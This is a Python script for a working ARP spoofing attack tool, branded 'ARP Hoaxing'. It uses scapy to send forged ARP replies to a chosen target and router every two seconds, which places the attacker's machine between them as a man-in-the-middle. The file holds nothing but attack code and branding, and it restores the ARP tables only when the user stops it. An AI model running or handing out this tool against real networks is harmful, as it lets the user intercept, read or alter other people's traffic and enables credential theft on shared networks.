#! /usr/bin/env python3

import sys
import time
import scapy.all as scapy
import optparse

#not important, just to make it looks cool
def intro():
    toolbar_width = 5
    BAR_width = 5
    sys.stdout.write("[*] Starting ARP Spoofer, Created by Mohamed , insta: @msecurity.bh\t" + "[%s]" % (" " * BAR_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (BAR_width + 1))
    for i in range(BAR_width):
        time.sleep(0.1)  # do real work here
        sys.stdout.write(".")
        sys.stdout.flush()
    sys.stdout.write("]\n")  # this ends the progress bar
intro()

def ascii_print():
    print("""
       █████████   ███████████   ███████████                               
  ███░░░░░███ ░░███░░░░░███ ░░███░░░░░███                              
 ░███    ░███  ░███    ░███  ░███    ░███                              
 ░███████████  ░██████████   ░██████████                               
 ░███░░░░░███  ░███░░░░░███  ░███░░░░░░                                
 ░███    ░███  ░███    ░███  ░███                                      
 █████   █████ █████   █████ █████                                     
░░░░░   ░░░░░ ░░░░░   ░░░░░ ░░░░░                                      
                                                                       
                                                                       
                                                                       
 █████   █████                                 ███                     
░░███   ░░███                                 ░░░                      
 ░███    ░███   ██████   ██████   █████ █████ ████  ████████    ███████
 ░███████████  ███░░███ ░░░░░███ ░░███ ░░███ ░░███ ░░███░░███  ███░░███
 ░███░░░░░███ ░███ ░███  ███████  ░░░█████░   ░███  ░███ ░███ ░███ ░███
 ░███    ░███ ░███ ░███ ███░░███   ███░░░███  ░███  ░███ ░███ ░███ ░███
 █████   █████░░██████ ░░████████ █████ █████ █████ ████ █████░░███████
░░░░░   ░░░░░  ░░░░░░   ░░░░░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░███
                                                               ███ ░███
                                                              ░░██████ 
                                                               ░░░░░░  
    """)
ascii_print()

# user input handler
def user_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--Target", dest="Target_ip", help="Target's IP")
    parser.add_option("-r", "--Router", dest="Router_ip", help="Router's IP")
    (options, arguments) = parser.parse_args()
    if not options.Target_ip:
        parser.error("[-] Please specify a Target IP to continue, use --help for more info")
    elif not options.Router_ip:
        parser.error("[-] Please specify a Router_ip to continue, use --help for more info")
    return options

# getting the MAC from IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

#op = 2, ARP Response. pdst=Target IP. hwdst=target mac. psrc="router IP source".

# spoofing function
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet_response, verbose=False)

# restoring the ARP tables
def restore_arp(fix_target_ip, fix_router_ip):
    fix_target_mac = get_mac(fix_target_ip)
    fix_router_mac = get_mac(fix_router_ip)
    restore_packet = scapy.ARP(op=2, pdst=fix_target_ip, hwdst=fix_target_mac, psrc=fix_router_ip, hwsrc=fix_router_mac)
    scapy.send(restore_packet, count=4, verbose=False)


options = user_arguments()

# infinite loop to spoof with some exceptions
try:
    sent_packets_count = 0
    while True:
        spoof(options.Target_ip, options.Router_ip)
        spoof(options.Router_ip, options.Target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Spoofing.." + str(sent_packets_count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Ctrl + C [-] Restoring ARP Tables")
    restore_arp(options.Target_ip, options.Router_ip)
    restore_arp(options.Router_ip, options.Target_ip)






